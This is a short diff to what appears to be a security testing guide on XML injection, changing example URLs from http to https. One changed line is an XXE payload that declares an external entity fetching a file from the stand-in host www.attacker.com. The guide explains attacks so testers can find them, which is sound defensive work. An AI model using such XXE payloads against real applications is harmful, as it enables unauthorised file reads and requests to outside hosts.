@@ -51,7 +51,7 @@ E-mail: s4tan@hell.com
 
 will produce the request:
 
-`http://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`
+`https://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com`
 
 The application, then, builds the following node:
 
@@ -275,7 +275,7 @@ Other useful tests are the following:
 
 <?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [ <!ELEMENT foo ANY >
-        <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
+        <!ENTITY xxe SYSTEM "https://www.attacker.com/text.txt" >]><foo>&xxe;</foo>
 ```
 
 ### Tag Injection
